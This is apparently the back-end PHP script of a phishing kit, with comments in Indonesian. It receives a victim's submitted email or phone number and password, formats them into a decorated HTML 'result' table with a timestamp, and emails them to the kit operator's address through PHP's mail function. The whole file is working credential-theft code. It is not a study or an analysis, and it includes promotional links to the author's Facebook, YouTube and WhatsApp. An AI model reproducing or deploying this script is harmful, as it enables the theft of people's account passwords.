<?php
// MENGAMBIL WAKTU RESS MASUK
date_default_timezone_set("Asia/Jakarta");

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$time = date('d-m-Y : h-i-s');

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if ($email == "" && $password == "") {
    header("Location: index.php");
} else {

// KONTEN RESULT AKUN
$subjek = "Ress lagi nih cuy { $email }";
$pesan = '
<center>
 <div style="background: url(https://j.top4top.io/p_2224gza4x0.png) no-repeat;border:2px solid pink;background-size: 100% 100%; width: 294; height: 101px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
</div>
 <table border="1" bordercolor="#19233f" style="color:#fff;border-radius:8px; border:3px solid pink; border-collapse:collapse;width:100%;background:#cf0485;">
    <tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Email/Telpon</b></th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$email.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Password</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$password.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Date/Time</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$time.'</th> 
</tr>
</table>
<div style="border:2px solid pink;width: 294; font-weight:bold; height: 20px; background: #cf0485; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align:center;">

<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#0744FF;" href="https://www.facebook.com/hackerrrrr">Facebook</a>
<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#FF0107;" href="https://cawlye.github.io">YouTube</a>
<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#25D366;" href="https://wa.me/6281393138971">WhatsApp</a>
</div>
 <center>
';

include 'email.php';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
mail($emailku, $subjek, $pesan, $headers);
}
?>
